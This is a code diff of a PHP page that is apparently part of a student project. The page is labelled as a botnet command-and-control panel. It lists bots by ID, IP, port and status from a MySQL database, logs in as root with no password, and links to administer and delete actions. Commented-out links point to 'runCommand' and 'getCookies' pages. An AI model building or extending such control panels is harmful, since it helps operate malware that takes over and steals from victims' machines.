@@ -56,49 +56,35 @@
 		<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTd-hQ_7nyVLXQ_NJU3MJhCA1JSXravIcUSWh0WHMDE&s" alt="" width="180vw">
 		<h2>Main Page</h2>
 		<?php
-		$db = new mysqli('localhost', 'root', '', 'pbl4');
+		$db = new mysqli('localhost', 'root', '', 'pbl4_v2');
 		if (mysqli_connect_errno()) exit;
 		echo '<p>Connected to Command and Control Server</p>';
-		$query = "SELECT ID, ip, port FROM botes";
+		$query = "SELECT ID, ip, port,status FROM botes where remove = 0";
 		$stmt = $db->prepare($query);
 		$stmt->execute();
-		$stmt->bind_result($ID, $ip, $port);
+		$stmt->bind_result($ID, $ip, $port, $status);
 
 		echo '<table>';
-		echo '<tr> <th>ID</th> <th>IP</th> <th>Port</th> <th>Select</th> <th>Delete</th></tr>';
+		echo '<tr> <th>ID</th> <th>IP</th> <th>Port</th> <th>Select</th><th>Status</th> <th>Delete</th></tr>';
 		while ($stmt->fetch()) {
 			echo '<tr>';
-			$administer = "<a href='../php/openBot.php?ip=" . $ip . "&port=" . $port . "'>administrator</a>";
+			$administer = "<a href='../php/openBot.php?ID=" . $ID . "'>administrator</a>";
 			// $administer = "<form action='botActive.php' method='post' name=''> <input type='submit' value='administer'> <a href='/PBL4/openBot.php?bot=" . $ip . "'>administer</a> </form>";
-			$delete = "<a href='../php/index.php?bot=" . $ip . "'>delete</a>";
+			$delete = "<a href='../php/handleRemoveBot.php?ID=" . $ID . "'>delete</a>";
+
+			$status_display = $status == 1 ? 'active' : 'non-active';
 			// $update = "<a href='../php/updateBot.php?bot=" . $ip . "'>update</a>";
 			// $runCommand = "<a href='../php/runCommand.php?ID=" . $ID . "'>runcommand</a>";
 			// $getCookies= "<a href='../php/getCookies.php?ID=" . $ID . "'>getcookies</a>";
-			echo '<td>' . $ID . '</td> <td>' . $ip . '</td> <td>' . $port . '</td> <td>' . $administer . '</td> <td>' . $delete . '</td>';
+			echo '<td>' . $ID . '</td> <td>' . $ip . '</td> <td>' . $port . '</td> <td>' . $administer . '</td> <td>' . $status_display  . '</td><td>' . $delete . '</td>';
 			echo '</tr>';
 		}
 		echo '</table>';
 		?>
-		<button><a href="addBot.php">Add Bot</a></button>
-		<button><a href="searchBot.php">Search Bot</button>
+		<!-- <button><a href="addBot.php">Add Bot</a></button>
+		<button><a href="searchBot.php">Search Bot</button> -->
 	</div>
 
 </body>
 
 </html>
-
-
-<?php
-if (isset($_GET['bot']) && !empty($_GET['bot'])) {
-	$bot =  $_GET['bot'];
-	$db = new mysqli('localhost', 'root', '', 'pbl4');
-	if (mysqli_connect_errno()) exit;
-	$query = "DELETE FROM botes WHERE ip=?";
-	$stmt = $db->prepare($query);
-	$stmt->bind_param('s', $bot);
-	$stmt->execute();
-	$db->close();
-	echo "bot deleted";
-	header("Location: ../php/index.php");
-}
-?>
